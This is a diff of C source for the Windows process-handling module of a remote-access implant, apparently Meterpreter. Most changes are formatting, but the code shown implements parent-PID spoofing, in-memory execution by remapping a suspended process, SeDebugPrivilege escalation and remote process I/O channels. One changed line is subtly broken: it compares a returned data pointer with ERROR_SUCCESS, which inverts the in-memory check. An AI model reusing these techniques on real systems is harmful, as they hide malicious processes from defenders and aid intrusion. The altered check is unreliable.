@@ -5,29 +5,27 @@
 #include "./../session.h"
 #include "in-mem-exe.h" /* include skapetastic in-mem exe exec */
 
-typedef BOOL (WINAPI *PEnumProcessModules)(HANDLE p, HMODULE *mod, DWORD cb, LPDWORD needed);
-typedef DWORD (WINAPI *PGetModuleBaseName)(HANDLE p, HMODULE mod, LPWSTR base, DWORD baseSize);
-typedef DWORD (WINAPI *PGetModuleFileNameEx)(HANDLE p, HMODULE mod, LPWSTR path, DWORD pathSize);
+typedef BOOL(WINAPI *PEnumProcessModules)(HANDLE p, HMODULE *mod, DWORD cb, LPDWORD needed);
+typedef DWORD(WINAPI *PGetModuleBaseName)(HANDLE p, HMODULE mod, LPWSTR base, DWORD baseSize);
+typedef DWORD(WINAPI *PGetModuleFileNameEx)(HANDLE p, HMODULE mod, LPWSTR path, DWORD pathSize);
 
-typedef BOOL (STDMETHODCALLTYPE FAR * LPFNCREATEENVIRONMENTBLOCK)( LPVOID  *lpEnvironment, HANDLE  hToken, BOOL bInherit );
-typedef BOOL (STDMETHODCALLTYPE FAR * LPFNDESTROYENVIRONMENTBLOCK) ( LPVOID lpEnvironment );
-typedef BOOL (WINAPI * LPCREATEPROCESSWITHTOKENW)( HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION );
-typedef BOOL (WINAPI * UPDATEPROCTHREADATTRIBUTE) (
+typedef BOOL(STDMETHODCALLTYPE FAR *LPFNCREATEENVIRONMENTBLOCK)(LPVOID *lpEnvironment, HANDLE hToken, BOOL bInherit);
+typedef BOOL(STDMETHODCALLTYPE FAR *LPFNDESTROYENVIRONMENTBLOCK)(LPVOID lpEnvironment);
+typedef BOOL(WINAPI *LPCREATEPROCESSWITHTOKENW)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+typedef BOOL(WINAPI *UPDATEPROCTHREADATTRIBUTE)(
 	LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
-	DWORD                        dwFlags,
-	DWORD_PTR                    Attribute,
-	PVOID                        lpValue,
-	SIZE_T                       cbSize,
-	PVOID                        lpPreviousValue,
-	PSIZE_T                      lpReturnSize
-);
+	DWORD dwFlags,
+	DWORD_PTR Attribute,
+	PVOID lpValue,
+	SIZE_T cbSize,
+	PVOID lpPreviousValue,
+	PSIZE_T lpReturnSize);
 
-typedef BOOL (WINAPI* INITIALIZEPROCTHREADATTRIBUTELIST) (
+typedef BOOL(WINAPI *INITIALIZEPROCTHREADATTRIBUTELIST)(
 	LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
-	DWORD                        dwAttributeCount,
-	DWORD                        dwFlags,
-	PSIZE_T                      lpSize
-);
+	DWORD dwAttributeCount,
+	DWORD dwFlags,
+	PSIZE_T lpSize);
 
 const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
 
@@ -84,7 +82,6 @@ DWORD request_sys_process_close(Remote *remote, Packet *packet)
 	DWORD result = ERROR_SUCCESS;
 	handle = (HANDLE)met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_HANDLE);
 
-
 	if (handle)
 	{
 		if (handle != GetCurrentProcess())
@@ -111,7 +108,8 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 {
 	Packet *response = met_api->packet.create_response(packet);
 	DWORD result = ERROR_SUCCESS;
-	Tlv inMemoryData;
+	PUCHAR inMemoryData;
+	DWORD inMemoryDataLength;
 	BOOL doInMemory = FALSE;
 	PROCESS_INFORMATION pi;
 	STARTUPINFOW si;
@@ -126,22 +124,22 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 	HANDLE token, pToken;
 	DWORD session = 0;
 	LPVOID pEnvironment = NULL;
-	LPFNCREATEENVIRONMENTBLOCK  lpfnCreateEnvironmentBlock  = NULL;
+	LPFNCREATEENVIRONMENTBLOCK lpfnCreateEnvironmentBlock = NULL;
 	LPFNDESTROYENVIRONMENTBLOCK lpfnDestroyEnvironmentBlock = NULL;
 	HMODULE hUserEnvLib = NULL;
-	ProcessChannelContext * ctx = NULL;
+	ProcessChannelContext *ctx = NULL;
 
-	dprintf( "[PROCESS] request_sys_process_execute" );
+	dprintf("[PROCESS] request_sys_process_execute");
 
 	// Initialize the startup information
-	memset( &pi, 0, sizeof(PROCESS_INFORMATION) );
-	memset( &si, 0, sizeof(STARTUPINFOW) );
+	memset(&pi, 0, sizeof(PROCESS_INFORMATION));
+	memset(&si, 0, sizeof(STARTUPINFOW));
 	si.cb = sizeof(STARTUPINFOW);
 	lpAttributeList = NULL;
 
 	// Initialize pipe handles
-	in[0]  = NULL;
-	in[1]  = NULL;
+	in[0] = NULL;
+	in[1] = NULL;
 	out[0] = NULL;
 	out[1] = NULL;
 
@@ -159,7 +157,7 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 		flags = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PROCESS_FLAGS);
 		ppid = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PARENT_PID);
 
-		if (met_api->packet.get_tlv(packet, TLV_TYPE_VALUE_DATA, &inMemoryData) == ERROR_SUCCESS)
+		if ((inMemoryData = met_api->packet.get_tlv_value_raw(packet, TLV_TYPE_VALUE_DATA, &inMemoryDataLength)) == ERROR_SUCCESS)
 		{
 			doInMemory = TRUE;
 			createFlags |= CREATE_SUSPENDED;
@@ -168,7 +166,7 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 		if (flags & PROCESS_EXECUTE_FLAG_DESKTOP)
 		{
 			cpDesktop = (char *)malloc(512);
-			if (!cpDesktop) 
+			if (!cpDesktop)
 			{
 				result = ERROR_NOT_ENOUGH_MEMORY;
 				break;
@@ -221,7 +219,7 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 		// such that input can be directed to and from the remote endpoint
 		if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED)
 		{
-			SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+			SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
 			PoolChannelOps chops;
 			Channel *newChannel;
 
@@ -295,7 +293,8 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 			createFlags |= CREATE_SUSPENDED;
 
 		// Set Parent PID if provided
-		if (ppid) {
+		if (ppid)
+		{
 			dprintf("[execute] PPID spoofing\n");
 			HMODULE hKernel32Lib = LoadLibrary("kernel32.dll");
 			INITIALIZEPROCTHREADATTRIBUTELIST InitializeProcThreadAttributeList = (INITIALIZEPROCTHREADATTRIBUTELIST)GetProcAddress(hKernel32Lib, "InitializeProcThreadAttributeList");
@@ -308,12 +307,13 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 				handle &&
 				hKernel32Lib &&
 				InitializeProcThreadAttributeList &&
-				UpdateProcThreadAttribute
-			) {
+				UpdateProcThreadAttribute)
+			{
 				size_t len = 0;
 				InitializeProcThreadAttributeList(NULL, 1, 0, &len);
 				lpAttributeList = malloc(len);
-				if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &len)) {
+				if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &len))
+				{
 					printf("[execute] InitializeProcThreadAttributeList: [%d]\n", GetLastError());
 					result = GetLastError();
 					break;
@@ -321,7 +321,8 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 
 				dprintf("[execute] InitializeProcThreadAttributeList\n");
 
-				if (!UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &handle, sizeof(HANDLE), 0, 0)) {
+				if (!UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &handle, sizeof(HANDLE), 0, 0))
+				{
 					printf("[execute] UpdateProcThreadAttribute: [%d]\n", GetLastError());
 					result = GetLastError();
 					break;
@@ -333,7 +334,8 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 
 				FreeLibrary(hKernel32Lib);
 			}
-			else {
+			else
+			{
 				result = GetLastError();
 				break;
 			}
@@ -518,7 +520,7 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 			// Unmap the dummy executable and map in the new executable into the
 			// target process
 			//
-			if (!MapNewExecutableRegionInProcess(pi.hProcess, pi.hThread, inMemoryData.buffer))
+			if (!MapNewExecutableRegionInProcess(pi.hProcess, pi.hThread, inMemoryData))
 			{
 				result = GetLastError();
 				break;
@@ -532,7 +534,6 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 				result = GetLastError();
 				break;
 			}
-
 		}
 
 		// check for failure here otherwise we can get a case where we
@@ -541,8 +542,7 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 		{
 			// if we managed to successfully create a channelized process, we need to retain
 			// a handle to it so that we can shut it down externally if required.
-			if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED
-				&& ctx != NULL)
+			if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED && ctx != NULL)
 			{
 				dprintf("[PROCESS] started process 0x%x", pi.hProcess);
 				ctx->pProcess = pi.hProcess;
@@ -574,7 +574,7 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 		free(commandLine);
 	}
 
-	if (commandLine_w) 
+	if (commandLine_w)
 	{
 		free(commandLine_w);
 	}
@@ -612,8 +612,8 @@ DWORD request_sys_process_kill(Remote *remote, Packet *packet)
 	DWORD index = 0;
 
 	while ((met_api->packet.enum_tlv(packet, index++, TLV_TYPE_PID,
-			&pidTlv) == ERROR_SUCCESS) &&
-			(pidTlv.header.length >= sizeof(DWORD)))
+									 &pidTlv) == ERROR_SUCCESS) &&
+		   (pidTlv.header.length >= sizeof(DWORD)))
 	{
 		DWORD pid = ntohl(*(LPDWORD)pidTlv.buffer);
 		HANDLE h = NULL;
@@ -641,51 +641,51 @@ DWORD request_sys_process_kill(Remote *remote, Packet *packet)
  * Gets the list of active processes (including their PID, name, user, arch and path)
  * and sends the information back to the requestor. See ps.c for the guts of this.
  */
-DWORD request_sys_process_get_processes( Remote * remote, Packet * packet )
+DWORD request_sys_process_get_processes(Remote *remote, Packet *packet)
 {
 
-	Packet * response = NULL;
-	HANDLE hToken     = NULL;
-	DWORD result      = ERROR_SUCCESS;
+	Packet *response = NULL;
+	HANDLE hToken = NULL;
+	DWORD result = ERROR_SUCCESS;
 
 	do
 	{
-		response = met_api->packet.create_response( packet );
-		if( !response )
+		response = met_api->packet.create_response(packet);
+		if (!response)
 			break;
 
 		// If we can, get SeDebugPrivilege...
-		if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) )
+		if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
 		{
 			TOKEN_PRIVILEGES priv = {0};
 
-			priv.PrivilegeCount           = 1;
+			priv.PrivilegeCount = 1;
 			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-			if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
-				AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL );
+			if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
+				AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);
 
-			CloseHandle( hToken );
+			CloseHandle(hToken);
 		}
 
 		// First we will try to get a process list via the toolhelp API. This method gives us the most information
 		// on all processes, including processes we cant actually open and all x64/x86 processes on x64 systems.
 		// However NT4 does not have the toolhelp API (but Win98 did!?!).
-		result = ps_list_via_toolhelp( response );
-		if( result != ERROR_SUCCESS )
+		result = ps_list_via_toolhelp(response);
+		if (result != ERROR_SUCCESS)
 		{
 			// Second attempt is to use the PSAPI functions which may work on NT4 if the PSAPI patch has been applied.
-			result = ps_list_via_psapi( response );
-			if( result != ERROR_SUCCESS )
+			result = ps_list_via_psapi(response);
+			if (result != ERROR_SUCCESS)
 			{
 				// Third method is to brute force the process list (and extract info from PEB) if all other methods have failed.
-				result = ps_list_via_brute( response );
+				result = ps_list_via_brute(response);
 			}
 		}
 
-		met_api->packet.transmit_response( result, remote, response );
+		met_api->packet.transmit_response(result, remote, response);
 
-	} while( 0 );
+	} while (0);
 
 	return result;
 }
@@ -809,7 +809,7 @@ DWORD request_sys_process_get_info(Remote *remote, Packet *packet)
  * FIXME: can-block
  */
 DWORD process_channel_read(Channel *channel, Packet *request,
-	LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesRead)
+						   LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesRead)
 {
 	ProcessChannelContext *ctx = (ProcessChannelContext *)context;
 
@@ -828,9 +828,9 @@ DWORD process_channel_read(Channel *channel, Packet *request,
  * Writes data from the remote half of the channel to the process's standard
  * input handle
  */
-DWORD process_channel_write(Channel* channel, Packet* request, LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesWritten)
+DWORD process_channel_write(Channel *channel, Packet *request, LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesWritten)
 {
-	ProcessChannelContext* ctx = (ProcessChannelContext*)context;
+	ProcessChannelContext *ctx = (ProcessChannelContext *)context;
 	DWORD result = ERROR_SUCCESS;
 
 	dprintf("[PROCESS] process_channel_write. channel=0x%08X, ctx=0x%08X", channel, ctx);
@@ -851,51 +851,55 @@ DWORD process_channel_write(Channel* channel, Packet* request, LPVOID context, L
 /*
  * Closes the channels that were opened to the process.
  */
-DWORD process_channel_close( Channel *channel, Packet *request, LPVOID context )
+DWORD process_channel_close(Channel *channel, Packet *request, LPVOID context)
 {
 	DWORD result = ERROR_SUCCESS;
 	ProcessChannelContext *ctx = (ProcessChannelContext *)context;
 
-	dprintf( "[PROCESS] process_channel_close. channel=0x%08X, ctx=0x%08X", channel, ctx );
+	dprintf("[PROCESS] process_channel_close. channel=0x%08X, ctx=0x%08X", channel, ctx);
 
 	if (ctx == NULL)
 	{
 		return result;
 	}
-	if ( ctx->pProcess != NULL ) {
-		dprintf( "[PROCESS] channel has an attached process, closing via scheduler signal. channel=0x%08X, ctx=0x%08X", channel, ctx );
-		met_api->scheduler.signal_waitable( ctx->pStdout, SchedulerStop );
-	} else {
-		CloseHandle( ctx->pStdin );
-		CloseHandle( ctx->pStdout );
+	if (ctx->pProcess != NULL)
+	{
+		dprintf("[PROCESS] channel has an attached process, closing via scheduler signal. channel=0x%08X, ctx=0x%08X", channel, ctx);
+		met_api->scheduler.signal_waitable(ctx->pStdout, SchedulerStop);
+	}
+	else
+	{
+		CloseHandle(ctx->pStdin);
+		CloseHandle(ctx->pStdout);
 
-		free( ctx );
+		free(ctx);
 	}
 	return result;
 }
 
-DWORD process_channel_interact_destroy( HANDLE waitable, LPVOID entryContext, LPVOID threadContext )
+DWORD process_channel_interact_destroy(HANDLE waitable, LPVOID entryContext, LPVOID threadContext)
 {
 	ProcessChannelContext *ctx = (ProcessChannelContext *)threadContext;
 	DWORD dwResult = ERROR_SUCCESS;
 	Channel *channel = (Channel *)entryContext;
 
-	dprintf( "[PROCESS] terminating context 0x%p", ctx );
+	dprintf("[PROCESS] terminating context 0x%p", ctx);
 
 	if (ctx == NULL)
 	{
 		return dwResult;
 	}
 
-	CloseHandle( ctx->pStdin );
-	CloseHandle( ctx->pStdout );
+	CloseHandle(ctx->pStdin);
+	CloseHandle(ctx->pStdout);
 
-	if( ctx->pProcess ) {
-		dprintf( "[PROCESS] terminating process 0x%x", ctx->pProcess );
-		TerminateProcess( ctx->pProcess, 0 );
+	if (ctx->pProcess)
+	{
+		dprintf("[PROCESS] terminating process 0x%x", ctx->pProcess);
+		TerminateProcess(ctx->pProcess, 0);
 	}
 
-	free( ctx );
+	free(ctx);
 	if (met_api->channel.exists(channel))
 	{
 		channel->ops.pool.native.context = NULL;
@@ -908,11 +912,11 @@ DWORD process_channel_interact_destroy( HANDLE waitable, LPVOID entryContext, LP
  * Callback for when data is available on the standard output handle of
  * a process channel that is interactive mode
  */
-DWORD process_channel_interact_notify(Remote* remote, LPVOID entryContext, LPVOID threadContext)
+DWORD process_channel_interact_notify(Remote *remote, LPVOID entryContext, LPVOID threadContext)
 {
 	dprintf("[PROCESS] process_channel_interact_notify: START");
-	Channel* channel = (Channel*)entryContext;
-	ProcessChannelContext* ctx = (ProcessChannelContext*)threadContext;
+	Channel *channel = (Channel *)entryContext;
+	ProcessChannelContext *ctx = (ProcessChannelContext *)threadContext;
 	DWORD bytesRead, bytesAvail = 0;
 	CHAR buffer[16384];
 	DWORD result = ERROR_SUCCESS;
@@ -963,9 +967,9 @@ DWORD process_channel_interact_notify(Remote* remote, LPVOID entryContext, LPVOI
 /*
  * Enables or disables interactivity with the standard output handle on the channel
  */
-DWORD process_channel_interact(Channel* channel, Packet* request, LPVOID context, BOOLEAN interact)
+DWORD process_channel_interact(Channel *channel, Packet *request, LPVOID context, BOOLEAN interact)
 {
-	ProcessChannelContext* ctx = (ProcessChannelContext*)context;
+	ProcessChannelContext *ctx = (ProcessChannelContext *)context;
 	DWORD result = ERROR_SUCCESS;
 
 	dprintf("[PROCESS] process_channel_interact. channel=0x%08X, ctx=0x%08X, interact=%d", channel, ctx, interact);
@@ -984,8 +988,8 @@ DWORD process_channel_interact(Channel* channel, Packet* request, LPVOID context
 		if ((result = met_api->scheduler.signal_waitable(ctx->pStdout, SchedulerResume)) == ERROR_NOT_FOUND)
 		{
 			result = met_api->scheduler.insert_waitable(ctx->pStdout, channel, context,
-				(WaitableNotifyRoutine)process_channel_interact_notify,
-				(WaitableDestroyRoutine)process_channel_interact_destroy);
+														(WaitableNotifyRoutine)process_channel_interact_notify,
+														(WaitableDestroyRoutine)process_channel_interact_destroy);
 		}
 	}
 	else
@@ -1004,19 +1008,19 @@ DWORD process_channel_interact(Channel* channel, Packet* request, LPVOID context
  */
 DWORD request_sys_process_wait(Remote *remote, Packet *packet)
 {
-	Packet * response = met_api->packet.create_response( packet );
-	HANDLE handle     = NULL;
-	DWORD result      = ERROR_INVALID_PARAMETER;
+	Packet *response = met_api->packet.create_response(packet);
+	HANDLE handle = NULL;
+	DWORD result = ERROR_INVALID_PARAMETER;
 
-	handle = (HANDLE)met_api->packet.get_tlv_value_qword( packet, TLV_TYPE_HANDLE );
+	handle = (HANDLE)met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_HANDLE);
 
-	if( handle )
+	if (handle)
 	{
-		if( WaitForSingleObject( handle, INFINITE ) == WAIT_OBJECT_0 )
+		if (WaitForSingleObject(handle, INFINITE) == WAIT_OBJECT_0)
 			result = ERROR_SUCCESS;
 	}
 
-	met_api->packet.transmit_response( result, remote, response );
+	met_api->packet.transmit_response(result, remote, response);
 
 	return result;
 }
